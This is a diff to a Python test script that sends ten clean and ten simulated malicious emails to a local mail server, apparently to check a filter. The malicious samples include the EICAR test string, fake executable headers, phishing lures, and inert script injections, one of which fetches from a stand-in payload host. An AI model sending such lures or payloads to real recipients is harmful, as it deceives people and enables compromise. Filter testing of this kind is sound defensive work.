@@ -6,10 +6,11 @@ import time
 
 # ───── Configuration ─────────────────────────────────────────────────────────
 SMTP_HOST = "127.0.0.1"
-SMTP_PORT = 25  
+SMTP_PORT = 25
 FROM_ADDR  = "sender@email-threat-docker.local"
 TO_ADDR    = "recipient@email-threat-docker.local"
 
+fake_pe = b"MZ" + b"\x00" * (0x3C - 2) + b"PE\x00\x00" + os.urandom(1000)
 # ───── Test Messages ─────────────────────────────────────────────────────────
 tests = [
     # 10 Clean Emails
@@ -25,31 +26,31 @@ tests = [
     ("Conference Registration", "Industry summit registration open", None),
 
     # 10 Malicious Emails (with rule triggers)
-    ("URGENT: Security Alert", "Scan attached file immediately!", 
+    ("URGENT: Security Alert", "Scan attached file immediately!",
      {"eicar.com": b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"}),
-    
+
     ("Invoice #INV-9876", "Please review payment details",
      {"invoice.exe": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"PE\x00\x00" + os.urandom(1000)}),
-     
+
     ("Account Verification Needed", "Click here: http://malicious.link/verify?user=<script>stealCreds()</script>", None),
-     
-    ("Document Shared", """<html><body><script>malware.download()</script>View document</body></html>""", 
+
+    ("Document Shared", """<html><body><script>malware.download()</script>View document</body></html>""",
      None, "html"),
-     
-    ("Encrypted Report", "Password: infected", 
+
+    ("Encrypted Report", "Password: infected",
      {"data.bin": os.urandom(1024)}),
-     
+
     ("Password Reset Required", "Immediate action required: http://phishing-site.com/reset", None),
-     
+
     ("Your Package Tracking", "javascript:fetch('http://malware-download.com/payload')", None),
-     
-    ("Financial Report", "See attached analysis", 
-     {"report.zip": b"PK\x03\x04" + os.urandom(500)}),  # ZIP header
-     
-    ("Microsoft Security Update", "Critical patch - apply immediately", 
-     {"update.msi": b"MZ" + os.urandom(1000)}),
-     
-    ("Undelivered Mail Notification", """<img src="http://tracker.com/pixel.gif">""", 
+
+    ("Financial Report", "See attached analysis",
+     {"report.zip": b"\x50\x4B\x03\x04FakeZIP"}),  # ZIP header match
+
+    ("Microsoft Security Update", "Critical patch - apply immediately",
+     {"update.msi": fake_pe}),
+
+    ("Undelivered Mail Notification", """<img src="http://tracker.com/pixel.gif">""",
      {"details.eml": b"From: <spoofed@ceo.com>\nSubject: Wire transfer\n"})
 ]
 
@@ -59,7 +60,7 @@ def send_email(subject, body, attachment=None, content_type="plain"):
     msg["To"] = TO_ADDR
     msg["Subject"] = subject
     msg.set_content(body, subtype=content_type)
-    
+
     if attachment:
         for fname, data in attachment.items():
             msg.add_attachment(data,
@@ -78,11 +79,11 @@ def main():
             content_type = "plain"
         else:
             subj, body, attach, content_type = test
-            
+
         resp = send_email(subj, body, attach, content_type)
         status = "CLEAN" if i < 10 else "MALICIOUS"
         print(f"[{status}] {subj}: {'Delivered' if not resp else 'Blocked'}")
-        time.sleep(1)
 
 if __name__ == "__main__":
     main()
+
